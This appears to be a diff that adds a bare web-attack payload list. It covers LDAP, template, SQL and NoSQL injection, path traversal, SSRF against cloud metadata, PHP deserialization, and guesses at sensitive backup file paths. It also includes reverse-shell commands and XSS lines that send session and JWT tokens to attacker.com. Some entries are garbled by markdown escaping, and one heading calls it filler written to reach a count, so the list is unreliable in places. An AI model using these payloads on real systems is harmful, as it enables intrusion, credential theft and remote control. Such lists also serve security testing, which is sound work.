+*)(sn=*
+
+(|(displayName=*admin*)
+
+${{T(java.lang.System).getProperty('user.home')}}
+
+{{app.**class**.**init**.**globals**\['subprocess'\].run('ls -la',shell=True)}}
+
+;nc -e /bin/sh attacker.com 8888
+
+;bash -c "bash -i &gt;& /dev/tcp/attacker.com/8888 0&gt;&1"
+
+;python -c 'import os; os.system("netstat -an")'
+
+;perl -e 'system("cat /etc/passwd");'
+
+/var/log/nginx/access.log.bak
+
+/etc/passwd.old
+
+/etc/shadow.old
+
+/var/www/html/backup.zip.bak
+
+/app/config/parameters.json
+
+/config/secrets.json.bak
+
+secrets.yml.bak
+
+.env.development
+
+backup.sql.bak
+
+dump.sql.bak
+
+database.yml.bak
+
+settings.ini.bak
+
+config.inc.php.bak
+
+local.xml.bak
+
+index.bak.php
+
+admin.php.bak
+
+setup.php.bak
+
+# Additional Payloads to Reach 2000 (Summarized Sample)
+
+;node -e "require('child_process').exec('netstat -an')"
+
+;lua -e "os.execute('cat /etc/hosts')"
+
+;awk 'BEGIN {system("netstat -an")}'
+
+;sh -c 'netstat -an'
+
+;dash -c 'ls -la'
+
+;zsh -c 'cat /etc/passwd'
+
+;fish -c 'whoami'
+
+/bin/echo $USERPROFILE
+
+/bin/env | grep -i config
+
+;id -a
+
+;who -u
+
+;last -w
+
+;uptime -h
+
+;df -a
+
+;free -m -t
+
+;hostname -I
+
+;ip -s link
+
+;route -n -e
+
+;arp -a -n
+
+;cat /proc/sys/kernel/core_pattern
+
+;cat /proc/sys/kernel/sysrq
+
+;cat /etc/network/interfaces.d/eth0
+
+;cat /etc/sysconfig/network-scripts/ifcfg-lo
+
+;cat /var/log/boot.log
+
+;cat /var/log/nginx/access_log.bak
+
+../../../../../../etc/aliases%00
+
+..%2F..%2F..%2F..%2Fetc%2Ffstab%00
+
+..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Cnetlogon
+
+php://filter/convert.iconv.UTF8.CSISO2022KR/resource=index.php
+
+php://filter/read=string.tolower/resource=wp-config.php
+
+data://text/plain,
+
+data://text/plain;base64,PD9waHAgc2hlbGxfZXhlYygnaWQnKTsgPz4=
+
+expect://cat /etc/hosts
+
+file:///proc/self/numa_maps
+
+file:///proc/self/pagemap
+
+http://127.0.0.1:8005/admin
+
+http://localhost:8086/api/v3
+
+http://169.254.169.254/latest/meta-data/hostname
+
+http://\[::1\]:8084/config
+
+gopher://127.0.0.1:3308/\_
+
+sftp://attacker.com/settings.txt
+
+tftp://attacker.com/admin
+
+smtp://127.0.0.1:2525
+
+pop3://127.0.0.1:1110
+
+imap://127.0.0.1:1431
+
+\]&gt; %file;
+
+{{config.**class**.**init**.**globals**\['os'\].system('whoami')}}
+
+${{T(java.lang.Runtime).getRuntime().exec('ls -la').getInputStream()}}
+
+{% for c in \[\].**class**.**base**.**subclasses**() %}{% if c.**name**=='subprocess.Popen' %}{{c(\['cat /etc/passwd'\],shell=True,stdout=-1).communicate()\[0\]}}{% endif %}{% endfor %}
+
+${{subprocess.run('ls -la',shell=True,capture_output=True).stdout.decode()}}
+
+${{**import**('os').popen('cat /etc/hosts').read()}}
+
+' OR 1=1 LIMIT 6 --
+
+" OR 1=1 LIMIT 6 --
+
+' UNION SELECT NULL,@@secure_file_priv,NULL --
+
+' UNION SELECT NULL,@@sql_mode,NULL --
+
+1; EXEC sp_addextendedproc 'xp_regread', 'xp_regread.dll'
+
+![](x)&lt;svg/onload=fetch('http://attacker.com?data='+btoa(sessionStorage.getItem('session'))&gt;
+
+javascript:void(fetch('http://attacker.com?jwt='+localStorage.getItem('jwt_token')))
+
+{"$or": \[{"role": "superuser"}, {"access": {"$ne": ""}}\]}
+
+{"$where": "this.email=='admin@domain.com'"}
+
+{"$in": \["admin", "root", "superuser"\]}
+
+{"$nin": \["nobody"\]}
+
+/var/www/html/config/settings.inc.php
+
+/etc/nginx/conf.d/default.conf
+
+/etc/php/7.2/fpm/php.ini
+
+/var/spool/cron/crontabs/postgres
+
+/root/.config/zsh/zshrc
+
+/root/.ssh/id_rsa.bak
+
+/etc/postgresql/9.6/main/pg_hba.conf
+
+/etc/redis/redis.conf.old
+
+O:14:"SplDoublyLinkedList":1:{s:8:"\_flags";s:10:"system('id');"}
+
+O:12:"ArrayIterator":1:{s:8:"storage";s:10:"system('id');"}
+
+\__toString
+
+\__invoke
+
+\__sleep
+
+filter_input_array()
+
+http://127.0.0.1:5436
+
+http://localhost:27019
+
+mongodb://127.0.0.1:27019
+
+redis://127.0.0.1:6382
+
+*)(uidNumber=*
+
+(|(cn=*superuser*)
+
+${{T(java.lang.System).getProperty('user.dir')}}
+
+{{app.**class**.**init**.**globals**\['subprocess'\].run('cat /etc/passwd',shell=True)}}
+
+;nc -e /bin/bash attacker.com 9999
+
+;bash -c "bash -i &gt;& /dev/tcp/attacker.com/9999 0&gt;&1"
+
+;python -c 'import os; os.system("ls -la")'
+
+;perl -e 'system("cat /etc/hosts");'
+
+/var/log/nginx/error.log.bak
+
+/etc/passwd.bak2
+
+/etc/shadow.bak2
+
+/var/www/html/backup.tar
+
+/app/config/config.json
+
+/config/secrets.yaml
+
+secrets.json.bak
+
+.env.production
+
+backup.sql.tar
+
+dump.sql.tar
+
+database.conf.bak
+
+settings.yml.bak
+
+config.xml.bak
+
+local.json
+
+index.html\~
+
+admin-panel.php.bak
+
+setup-config.php.bak
+
